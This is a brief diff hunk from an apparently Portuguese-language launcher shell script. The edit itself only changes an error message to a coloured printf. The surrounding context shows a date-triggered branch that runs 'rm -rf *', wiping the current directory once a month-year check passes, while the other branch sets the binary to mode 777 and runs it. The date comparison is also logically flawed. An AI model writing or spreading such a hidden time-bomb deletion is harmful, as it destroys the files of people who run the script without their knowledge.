@@ -35,6 +35,6 @@ if (($(date +%m%y) >= 0222)); then
     rm -rf *
 else
     chmod 777 main
-    ./main || echo "não compatível" 
+    ./main || printf "\e[1;31mnão compatível com sistema atual\e[m\n"
 fi
 exit 0
